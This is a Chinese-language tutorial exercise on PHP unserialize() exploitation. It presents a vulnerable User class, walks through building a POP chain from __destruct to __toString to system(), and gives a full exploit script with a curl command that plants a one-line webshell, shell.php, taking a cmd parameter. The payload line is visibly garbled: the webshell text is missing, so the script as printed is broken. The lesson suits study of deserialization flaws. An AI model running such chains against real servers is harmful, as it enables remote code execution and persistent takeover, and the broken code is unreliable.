例题1：User类反序列化执行系统命令

题目描述

已知服务端存在自定义 User 类，存在PHP反序列化漏洞。 反序列化入口接收POST传参的 data 值，要求利用该漏洞构造POP链， 执行系统命令在服务端写入一句话木马 shell.php， 木马需支持通过GET参数 cmd 执行任意PHP代码。

服务端源码 


class User
{
    public $username;
    public $isAdmin;
    public $cmd;

    // 析构方法：对象销毁时触发，拼接输出username
    public function __destruct()
    {
        echo "Hello," . $this->username;
    }

    // 字符串方法：对象被当作字符串时触发
    public function __toString()
    {
        // 管理员身份验证，通过则执行系统命令
        if ($this->isAdmin) {
            system($this->cmd);
            return $this->username;
        }
        return "not admin";
    }
}

// 反序列化入口：接收POST参数data，无任何过滤
$a = unserialize($_POST['data']);
?>

漏洞分析

POP链构造思路（反向回溯法）

1

确定目标危险函数

目标函数：system($this->cmd)

在 __toString() 方法中，当 $this->isAdmin=true 时执行

2

找到触发条件

触发方式：对象被当作字符串使用（如 echo $obj）

找到 __destruct() 中的 echo $this->username

3

构造POP链

让 $user2->username = $user1（对象）

脚本结束时，$user2 先被销毁，触发 __destruct()

调用链图解

unserialize()

反序列化入口

__destruct()

echo $this->username

__toString()

system()

执行命令

关键点： $user2->username = $user1（对象赋值）会导致 echo 时触发 __toString()

解题步骤

  1. 1

    分析类结构

    User类有三个属性：username、isAdmin、cmd

  2. 2

    确定利用条件

    需要 $this->isAdmin = true 才能执行 system()

  3. 3

    构造内部对象 $user1

    设置 isAdmin = true，cmd = "echo '...' > shell.php"

  4. 4

    构造外部对象 $user2

    设置 username = $user1（对象），用于触发 __toString()

  5. 5

    序列化并URL编码

    POST提交 data 参数

完整EXP脚本 


// 例题1 EXP: User类反序列化触发system执行命令

class User {
    public $username;
    public $isAdmin;
    public $cmd;
}

// Step 1: 创建内部对象，用于触发危险函数
$user1 = new User();
$user1->isAdmin = true;              // 绕过admin检查
// 写入一句话木马到shell.php
$user1->cmd = "echo ' shell.php";
$user1->username = "john";             // 填充属性

// Step 2: 创建外部对象，用于触发__toString
$user2 = new User();
$user2->username = $user1;              // 关键！赋值对象引用

// Step 3: 序列化并URL编码
$payload = urlencode(serialize($user2));

echo "Payload:\n";
echo $payload;
echo "\n\n使用方法：\n";
echo "curl -X POST http://target.com/index.php -d 'data=" . $payload . "'\n";
echo "然后访问 http://target.com/shell.php?cmd=phpinfo();\n";
